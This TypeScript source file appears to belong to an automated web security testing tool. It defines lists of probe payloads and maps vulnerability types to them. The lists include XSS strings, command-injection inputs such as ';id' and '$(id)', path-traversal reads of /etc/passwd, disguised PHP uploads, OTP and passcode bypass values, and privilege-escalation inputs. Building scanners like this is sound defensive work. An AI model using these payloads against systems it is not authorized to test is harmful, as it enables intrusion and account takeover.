export interface AttackPayload {
  label: string;
  value: string;
  description: string;
  severity_hint?: 'critical' | 'high' | 'medium' | 'low';
}

export const FILE_UPLOAD_PAYLOADS = [
  { label: 'normal', filename: 'bstg-normal.png', content_type: 'image/png', body: '\x89PNG\r\n\x1a\nBSTG_SAFE_IMAGE' },
  { label: 'svg_xss', filename: 'bstg-svg-xss.svg', content_type: 'image/svg+xml', body: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>bstg</text></svg>' },
  { label: 'html_polyglot', filename: 'bstg-image.html', content_type: 'text/html', body: '<!doctype html><script>alert(1)</script>' },
  { label: 'double_extension', filename: 'bstg-avatar.png.php', content_type: 'image/png', body: '\x89PNG\r\n<?php echo "BSTG"; ?>' },
  { label: 'mime_bypass', filename: 'bstg-avatar.php', content_type: 'image/png', body: '<?php echo "BSTG"; ?>' },
  { label: 'filename_traversal', filename: '../bstg-traversal.svg', content_type: 'image/svg+xml', body: '<svg xmlns="http://www.w3.org/2000/svg"><text>traversal</text></svg>' },
];

export const PATH_TRAVERSAL_PAYLOADS: AttackPayload[] = [
  { label: 'linux_passwd', value: '../../../../../../etc/passwd', description: 'Classic Linux file traversal', severity_hint: 'high' },
  { label: 'encoded_linux_passwd', value: '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', description: 'URL-encoded traversal', severity_hint: 'high' },
  { label: 'windows_ini', value: '..\\..\\..\\..\\Windows\\win.ini', description: 'Windows traversal', severity_hint: 'medium' },
  { label: 'null_byte', value: '../../../../../../etc/passwd%00.png', description: 'Null-byte extension bypass', severity_hint: 'high' },
];

export const XSS_PAYLOADS: AttackPayload[] = [
  { label: 'script_tag', value: '<script>alert(1337)</script>', description: 'Script tag reflection/storage probe', severity_hint: 'medium' },
  { label: 'img_onerror', value: '<img src=x onerror=alert(1337)>', description: 'Attribute event handler probe', severity_hint: 'medium' },
  { label: 'svg_onload', value: '<svg/onload=alert(1337)>', description: 'SVG onload probe', severity_hint: 'medium' },
];

export const COMMAND_INJECTION_PAYLOADS: AttackPayload[] = [
  { label: 'semicolon_id', value: ';id', description: 'Shell command separator id probe', severity_hint: 'critical' },
  { label: 'pipe_whoami', value: '|whoami', description: 'Pipe command probe', severity_hint: 'critical' },
  { label: 'backtick_id', value: '`id`', description: 'Backtick substitution probe', severity_hint: 'critical' },
  { label: 'subshell_id', value: '$(id)', description: 'Subshell substitution probe', severity_hint: 'critical' },
];

export const IDOR_PAYLOADS: AttackPayload[] = [
  { label: 'id_1', value: '1', description: 'Object id boundary value', severity_hint: 'high' },
  { label: 'id_2', value: '2', description: 'Object id adjacent value', severity_hint: 'high' },
  { label: 'uuid_zero', value: '00000000-0000-0000-0000-000000000000', description: 'UUID zero probe', severity_hint: 'medium' },
];

export const BFLA_PAYLOADS: AttackPayload[] = [
  { label: 'admin_role', value: 'admin', description: 'Vertical privilege escalation role probe', severity_hint: 'high' },
  { label: 'is_admin_true', value: 'true', description: 'Boolean administrator flag probe', severity_hint: 'high' },
  { label: 'role_id_1', value: '1', description: 'Privileged role id probe', severity_hint: 'high' },
  { label: 'role_id_2', value: '2', description: 'Alternate role id probe', severity_hint: 'medium' },
];

export const AUTH_OTP_BYPASS_PAYLOADS: AttackPayload[] = [
  { label: 'empty_code', value: '', description: 'Empty OTP/passcode probe', severity_hint: 'medium' },
  { label: 'zero_code', value: '000000', description: 'Common zero OTP/passcode probe', severity_hint: 'high' },
  { label: 'sequential_code', value: '123456', description: 'Common sequential OTP/passcode probe', severity_hint: 'high' },
  { label: 'short_code', value: '1111', description: 'Weak 4-digit passcode probe', severity_hint: 'medium' },
  { label: 'reuse_code', value: '{{previous_code}}', description: 'OTP reuse/cross-step ticket replay probe', severity_hint: 'high' },
  { label: 'victim_code_reuse', value: '{{victim_otp_code}}', description: 'Cross-account SMS/email code reuse probe', severity_hint: 'high' },
  { label: 'missing_ticket', value: '{{omit_ticket}}', description: 'Missing captcha/otp ticket bypass probe', severity_hint: 'medium' },
];

export const PASSCODE_BYPASS_PAYLOADS: AttackPayload[] = [
  { label: 'empty_passcode', value: '', description: 'Empty pay/passcode probe', severity_hint: 'high' },
  { label: 'zero_passcode', value: '000000', description: 'Common zero pay/passcode probe', severity_hint: 'high' },
  { label: 'sequential_passcode', value: '123456', description: 'Common sequential passcode probe', severity_hint: 'high' },
  { label: 'boolean_true', value: 'true', description: 'Boolean passcode verification bypass probe', severity_hint: 'medium' },
  { label: 'skip_passcode', value: '{{omit_passcode}}', description: 'Omit passcode field and test server-side enforcement', severity_hint: 'high' },
];

export const BUSINESS_LOGIC_PAYLOADS: AttackPayload[] = [
  { label: 'negative_amount', value: '-1', description: 'Negative amount/count probe', severity_hint: 'high' },
  { label: 'zero_amount', value: '0', description: 'Zero price/count probe', severity_hint: 'medium' },
  { label: 'large_amount', value: '999999999', description: 'Overflow/limit probe', severity_hint: 'medium' },
  { label: 'admin_role', value: 'admin', description: 'Role escalation probe', severity_hint: 'high' },
  { label: 'paid_status', value: 'paid', description: 'State transition bypass probe', severity_hint: 'high' },
];

export function payloadsForVulnType(vulnType: string): AttackPayload[] {
  switch (vulnType) {
    case 'path_traversal':
    case 'file_download':
      return PATH_TRAVERSAL_PAYLOADS;
    case 'xss':
      return XSS_PAYLOADS;
    case 'command_injection':
      return COMMAND_INJECTION_PAYLOADS;
    case 'bola_idor':
      return IDOR_PAYLOADS;
    case 'bfla':
      return BFLA_PAYLOADS;
    case 'auth_otp':
    case 'email_sms_bypass':
      return AUTH_OTP_BYPASS_PAYLOADS;
    case 'passcode_bypass':
      return PASSCODE_BYPASS_PAYLOADS;
    case 'business_logic':
    case 'replay_race':
    case 'state_machine_race':
      return BUSINESS_LOGIC_PAYLOADS;
    default:
      return [];
  }
}
